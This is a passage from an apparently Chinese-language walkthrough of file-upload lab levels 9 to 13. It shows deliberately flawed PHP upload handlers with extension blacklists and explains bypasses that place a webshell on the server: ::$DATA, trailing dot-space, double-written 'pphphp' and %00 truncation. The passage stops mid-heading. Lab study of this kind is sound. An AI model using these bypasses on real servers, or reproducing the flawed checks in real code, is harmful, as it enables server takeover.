class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件类型不允许上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-8" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-8" class="header-mark"></a>绕过方法</h3><p>对上传的文件后缀名未做去除<code>::$DATA</code> 处理</p>
<p>Windows 系统下，如果上传的文件名为  <code>Webshell.php::$DATA</code> 会在服务器上生成一个 <code>Webshell.php </code>的文件，其中内容和所上传文件内容相同，并被解析。</p>
<p>​</p>
<h2 id="第十关拼接绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e5%85%b3%e6%8b%bc%e6%8e%a5%e7%bb%95%e8%bf%87" class="header-mark"></a>第十关(拼接绕过)</h2><h3 id="相关源码-9" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-9" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件类型不允许上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-9" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-9" class="header-mark"></a>绕过方法</h3><p>因为代码是先删一个<code>.</code>再删一个<code> </code>然后再拿文件后缀名去黑名单里比较，所以可以将 <code>Webshell.php</code> 重命名为 <code>Webshell.php. .</code></p>
<p>这样在上传后等到和黑名单比较时文件名为 <code>Webshell.php.</code></p>
<p>​</p>
<h2 id="第十一关双写绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%b8%80%e5%85%b3%e5%8f%8c%e5%86%99%e7%bb%95%e8%bf%87" class="header-mark"></a>第十一关(双写绕过)</h2><h3 id="相关源码-10" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-10" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;php5&#34;</span><span class="p">,</span><span class="s2">&#34;php4&#34;</span><span class="p">,</span><span class="s2">&#34;php3&#34;</span><span class="p">,</span><span class="s2">&#34;php2&#34;</span><span class="p">,</span><span class="s2">&#34;html&#34;</span><span class="p">,</span><span class="s2">&#34;htm&#34;</span><span class="p">,</span><span class="s2">&#34;phtml&#34;</span><span class="p">,</span><span class="s2">&#34;pht&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;jspa&#34;</span><span class="p">,</span><span class="s2">&#34;jspx&#34;</span><span class="p">,</span><span class="s2">&#34;jsw&#34;</span><span class="p">,</span><span class="s2">&#34;jsv&#34;</span><span class="p">,</span><span class="s2">&#34;jspf&#34;</span><span class="p">,</span><span class="s2">&#34;jtml&#34;</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;asa&#34;</span><span class="p">,</span><span class="s2">&#34;asax&#34;</span><span class="p">,</span><span class="s2">&#34;ascx&#34;</span><span class="p">,</span><span class="s2">&#34;ashx&#34;</span><span class="p">,</span><span class="s2">&#34;asmx&#34;</span><span class="p">,</span><span class="s2">&#34;cer&#34;</span><span class="p">,</span><span class="s2">&#34;swf&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">,</span><span class="s2">&#34;ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$deny_ext</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-10" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-10" class="header-mark"></a>绕过方法</h3><p>代码利用  <code>str_ireplace()</code>将文件名中符合黑名单的字符串替换成空。</p>
<p>将 <code>Webshell.php</code> 重命名为 <code>Webshell.pphphp</code></p>
<p>​</p>
<h2 id="第十二关get型截断绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%ba%8c%e5%85%b3get%e5%9e%8b%e6%88%aa%e6%96%ad%e7%bb%95%e8%bf%87" class="header-mark"></a>第十二关(GET型截断绕过)</h2><h3 id="相关源码-11" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-11" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;save_path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-11" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-11" class="header-mark"></a>绕过方法</h3><p>使用白名单限制上传文件类型，但上传文件的存放路径可控</p>
<p>利用方法：抓包，设置上传路径为  <code>upload/webshell.php%00</code>  ,上传文件为<code>webshell.jpg</code>，保存后为 <code>/upload/webshell.php%00webshell.jpg</code>，但服务端读取到<code>%00 </code>时会自动结束，将文件 内容保存至  <code>webshell.php</code> 中。</p>
<p>前提：</p>
<ul>
<li>php版本要小于5.3.4。</li>
<li>文件路径可控。</li>
<li>magic_quotes_gpc需要为OFF状态。(在php.ini中)</li>
</ul>
<p><code>%00</code>为Unicode形式的截断符，用于GET型控制路径。<code>0x00</code>为16进制的截断符，用于POST型控制路径。</p>
<p>​</p>
<h2 id="第十三关post型截断绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%b8%89%e5%85%b3post%e5%9e%8b%e6%88%aa%e6%96%ad%e7%bb%95%e8%bf%87" class="header-mark"></a>第十三关(POST型截断绕过)</h2><h3 id="相关源码-12" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-12" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传失败&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-12" class="headerLink">
